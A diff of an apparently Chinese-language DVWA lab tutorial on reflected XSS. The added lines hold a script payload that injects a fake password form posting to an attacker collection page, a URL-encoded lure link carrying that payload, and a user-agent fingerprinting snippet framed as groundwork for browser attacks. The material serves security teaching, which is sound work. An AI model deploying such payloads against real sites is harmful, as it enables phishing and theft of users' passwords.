@@ -26,14 +26,6 @@
 
 ![r_low4](img/r_low4.png)
 
-链接为
-
-```
-http://dvwa.localhost/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22hack%22%29%3B%3C%2Fscript%3E#
-```
-
-
-
 ### cookie劫持
 
 在输入框中输入：
@@ -122,7 +114,27 @@ print(response.status_code)
 </script>
 ```
 
+如果这个太长，也可以按照下述方式构造输入
+
+```javascript
+<script>
+    
+var parent = document.getElementById("main_body");
+   var dd = document.createElement("div");
+   parent.appendChild(dd);
+   dd.innerHTML = '<p>原密码:</p>' + '<form action = "http://csrf.localhost/hack.php" method = "post">'+
+                '<input type = "text" name="oldpassword">' +
+                '<input type = "submit">' + '</form>';
+</script>
+```
+
 用户输入以上代码（一般是诱使用户点击name字段为上述代码的链接，实际会伪装这个链接）
+
+对应的链接为：
+
+```
+http://dvwa.localhost/vulnerabilities/xss_r/?name=%3Cscript%3E++++++var+parent+%3D+document.getElementById%28%22main_body%22%29%3B++++var+dd+%3D+document.createElement%28%22div%22%29%3B++++parent.appendChild%28dd%29%3B++++dd.innerHTML+%3D+%27%3Cp%3E%E5%8E%9F%E5%AF%86%E7%A0%81%3A%3C%2Fp%3E%27+%2B+%27%3Cform+action+%3D+%22http%3A%2F%2Fcsrf.localhost%2Fhack.php%22+method+%3D+%22post%22%3E%27%2B+++++++++++++++++%27%3Cinput+type+%3D+%22text%22+name%3D%22oldpassword%22%3E%27+%2B+++++++++++++++++%27%3Cinput+type+%3D+%22submit%22%3E%27+%2B+%27%3C%2Fform%3E%27%3B+%3C%2Fscript%3E#
+```
 
 ![XSS1](img/XSS1.png)
 
@@ -142,6 +154,20 @@ print(response.status_code)
       fclose($passtxt);
       header("http://dvwa.localhost/vulnerabilities/xss_r/?name=#");  //转跳到正常页面 
      ?>
+```
+
+
+
+
+
+## 获取用户的浏览器
+
+可以通过类似cookie劫持的方式将此信息发送到攻击者的服务器。攻击者如果知道了用户浏览器的信息，就可以实施一次精准的浏览器内存攻击。
+
+```javascript
+<script>
+    alert(navigator.userAgent);
+</script>
 ```
 
 
